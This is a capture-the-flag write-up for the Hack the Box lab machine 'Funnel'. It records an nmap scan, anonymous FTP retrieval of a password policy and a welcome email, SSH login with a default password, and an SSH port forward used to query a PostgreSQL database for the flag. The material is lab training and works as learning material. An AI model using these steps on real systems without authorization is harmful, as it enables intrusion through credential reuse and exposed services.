# Hack the Box - "Funnel" - 10.129.228.195
# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -oA enum/nmap-initial 10.129.228.195
```

Output
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28 14:31 mail_backup
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Full Scan
Command
```
nmap -A -vv -p- -oA enum/nmap-full 10.129.228.195
```

Output
```

```

## Port 21
### FTP Open to Anonymous login
![](../Attachments/Pasted%20image%2020230520205302.png)

"mail_backup" directory found on ftp service.
![](../Attachments/Pasted%20image%2020230520205349.png)

"password_policy.pdf" and "welcome_28112022" files found in mail_backup directory.
![](../Attachments/Pasted%20image%2020230520205543.png)

Used mget to move both files from ftp service to local machine.
```
mget password_policy.pdf
mget welcome_28112022
```

---

# Vulnerabilities

Open "password_policy.pdf".
```
xdg-open password_policy.pdf
```

Default password exposed. "funnel123#!#" 
![](../Attachments/Pasted%20image%2020230520205930.png)

Open "welcome_28112022" email file.
```
cat welcome_28112022
```

New users exposed. optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
![](../Attachments/Pasted%20image%2020230520210113.png)

Able to login to ssh with christine:funnel123#!#
![](../Attachments/Pasted%20image%2020230520210410.png)
---

# Privilege Escalation

Found service running on port 5432.
```
ss -tln
```
![](../Attachments/Pasted%20image%2020230520213515.png)

Found that postgresql is running on port 5432
```
ss -tl
```
![](../Attachments/Pasted%20image%2020230520213608.png)

Unable to access postgresql via target machine because the "psql" command is not installed on target.

Need to do a local port forward to access host machine commands.
```
ssh -L 1234:localhost:5432 christine@10.129.228.195
```

Verified port forward on host machine.
```
ss -tlpn
```
![](../Attachments/Pasted%20image%2020230520214014.png)
Able to access the postgresql service via port forwarding on the host machine.
```
psql -U christine -h localhost -p 1234
```
![](../Attachments/Pasted%20image%2020230520214133.png)

Listed directories to find a Secrets Directory in the database.
```
\list
```
![](../Attachments/Pasted%20image%2020230520214324.png)
Switch to secrets database.
```
\c secrets
```

---

# Loot
## Root/Admin
Command
```
select * from public.flag;
```
>![](../Attachments/Pasted%20image%2020230520215504.png)
